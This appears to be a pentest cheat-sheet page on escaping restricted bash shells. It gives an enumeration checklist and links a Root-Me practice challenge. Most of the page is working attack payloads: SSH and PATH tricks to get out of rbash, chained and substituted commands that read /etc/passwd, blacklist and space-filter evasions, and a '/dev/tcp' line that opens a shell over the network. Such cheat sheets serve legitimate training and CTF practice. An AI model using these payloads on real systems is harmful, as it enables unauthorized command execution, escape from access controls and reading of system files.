---
description: Bypass restricted shells
---

# Restricted shells

## Example for restricted shell

```text
root@Desktop: ~ #ssh -6 user@fe80::XXXXX:2c74%wlan0 
user@fe80::XXXXX:2c74%wlan0 's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.15.0-34-generic x86_64) 
Documentation:  https://help.ubuntu.com 
Management:     https://landscape.canonical.com 
Support:        https://ubuntu.com/advantage 
Last login: Fri Jul 12 14:15:45 2019 from fe80::XXXXX:2c74%wlan0  
jail@HOST:~$ -rbash: /dev/null: restricted: cannot redirect output 
bash: _upvars: -a0': invalid number specifier  
-rbash: /dev/null: restricted: cannot redirect output  
bash: _upvars: -a0': invalid number specifier 
-rbash: /dev/null: restricted: cannot redirect output 
bash: _upvars: -a0': invalid number specifier  
-rbash: /dev/null: restricted: cannot redirect output  
bash: _upvars: -a0': invalid number specifier 
     
user@HOST:~$ vim 
-rbash: /usr/lib/command-not-found: restricted: cannot specify /' in command names  
jail@HOST:~$ exit 
logout  
-rbash: /usr/bin/clear_console: restricted: cannot specify /' in command names 
Connection to fe80::XXXXX:2c74%wlan0  closed. 
 
```

First: 

1. Check 'echo $PATH' 
2. Ls  to check what command in the $path \(ls -l /home/student/.bin\) 
3. Fix path  export PATH=/bin:/usr/bin 

**Enumeration Linux Environment Enumeration is the most important part**. We need to enumeration the Linux environmental to check what we can do to bypass the rbash. 

We need to enumerate :  

1. First we must to check for available commands like cd/ls/echo etc.  
2. We must to check for operators like &gt;,&gt;&gt;,&lt;,\|.  
3. We need to check for available programming languages like perl,ruby,python etc.  
4. Which commands we can run as root \(sudo -l\).  
5. Check for files or commands with SUID perm.  
6. You must to check in what shell you are : echo $SHELL you will be in rbash by 90%  
7. Check for the Environmental Variables : run env or printenv Now let’s move into Common Exploitation Techniques. 

### Practice

Practice restricted shell escape:

{% embed url="https://www.root-me.org/en/Challenges/App-Script/Bash-Restricted-shells" %}



## SSH

`ssh user@192.168.0.53 -t bash` 

Or 

`ssh user@192.168.0.53 -t /bin/bash` 

Or

`ssh user@192.168.0.53 -t "bash --noprofile"`

## Add Path

`export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`

## Chaining commands 

```text
original_cmd_by_server; ls 
original_cmd_by_server && ls 
original_cmd_by_server | ls 
original_cmd_by_server || ls    Only if the first cmd fail 
```

## Inside a command 

```text
original_cmd_by_server `cat /etc/passwd` 
original_cmd_by_server $(cat /etc/passwd)
```

## Filter Bypasses 

### Bypass without space 

Works on Linux only. 

`cat</etc/passwd` 

`{cat,/etc/passwd}` 

`cat$IFS/etc/passwd` 

`echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd` 

`X=$'uname\x20-a'&&$X` 

`sh</dev/tcp/127.0.0.1/4242` 

### Commands execution without spaces, $ or { } - Linux \(Bash only\) 

``IFS=,;`cat<<<uname,-a``

Works on Windows only. 

`ping%CommonProgramFiles:~10,-18%IP` 

`ping%PROGRAMFILES:~10,-5%IP` 

### Bypass with a line return 

`something%0Acat%20/etc/passwd` 

### Bypass Blacklisted words 

**Bypass with single quote** 

`w'h'o'am'i` 

**Bypass with double quote** 

`w"h"o"am"i` 

**Bypass with backslash and slash** 

`w\ho\am\i` 

`/\b\i\n/////s\h` 

**Bypass with $@** 

`who$@ami` 

echo $0 

-&gt; /usr/bin/zsh 

echo whoami\|$0 

**Bypass with variable expansion** 

`/???/??t /???/p??s??` 

test=/ehhh/hmtc/pahhh/hmsswd 

cat ${test//hhh\/hm/} 

cat ${test//hh??hm/} 

**Bypass with wildcards** 

`powershell C:\*\*2\n??e*d.*? # notepad` 

`@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc` 

